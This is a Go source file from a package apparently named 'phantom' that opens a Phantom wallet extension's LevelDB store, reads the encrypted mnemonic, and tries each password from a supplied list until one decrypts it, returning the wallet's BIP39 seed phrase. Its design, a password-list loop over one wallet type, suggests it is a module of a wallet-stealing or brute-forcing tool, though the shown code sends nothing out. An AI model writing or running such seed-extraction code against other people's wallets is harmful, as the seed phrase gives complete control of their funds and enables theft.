package phantom

import (
	"bytes"
	"crypto/sha256"
	"encoding/json"
	"fmt"

	"github.com/mr-tron/base58/base58"
	"github.com/syndtr/goleveldb/leveldb"
	"github.com/tyler-smith/go-bip39"
	"golang.org/x/crypto/nacl/secretbox"
	"golang.org/x/crypto/pbkdf2"
)

type Phantom struct{}

type Data struct {
	Encrypted  string `json:"encrypted"`
	Nonce      string `json:"nonce"`
	Kdf        string `json:"kdf"`
	Salt       string `json:"salt"`
	Iterations int    `json:"iterations"`
	Digest     string `string:"digest"`
}

type Row struct {
	Value string `json:"value"`
}

func (Phantom) GetMnemonic(path string, passwords []string) (string, error) {
	db, err := leveldb.OpenFile(path, nil)
	if err != nil {
		return "", err
	}

	encryptedData, err := db.Get([]byte("encryptedMnemonic"), nil)
	if err != nil {
		return "", err
	}

	var row Row
	if err = json.Unmarshal(encryptedData, &row); err != nil {
		return "", err
	}

	var data Data
	if err = json.Unmarshal(bytes.ReplaceAll([]byte(row.Value), []byte(`\"`), []byte(`"`)), &data); err != nil {
		return "", err
	}

	salt, err := base58.Decode(data.Salt)
	if err != nil {
		return "", err
	}
	nonce, err := base58.Decode(data.Nonce)
	if err != nil {
		return "", err
	}
	encrypted, err := base58.Decode(data.Encrypted)
	if err != nil {
		return "", err
	}

	for _, password := range passwords {
		key := pbkdf2.Key([]byte(password), salt, data.Iterations, 32, sha256.New)

		decrypted, ok := secretbox.Open(nil, encrypted, (*[24]byte)(nonce), (*[32]byte)(key))
		if !ok {
			continue
		}

		return bip39.NewMnemonic(decrypted)
	}

	return "", fmt.Errorf("no valid password for %s", path)
}
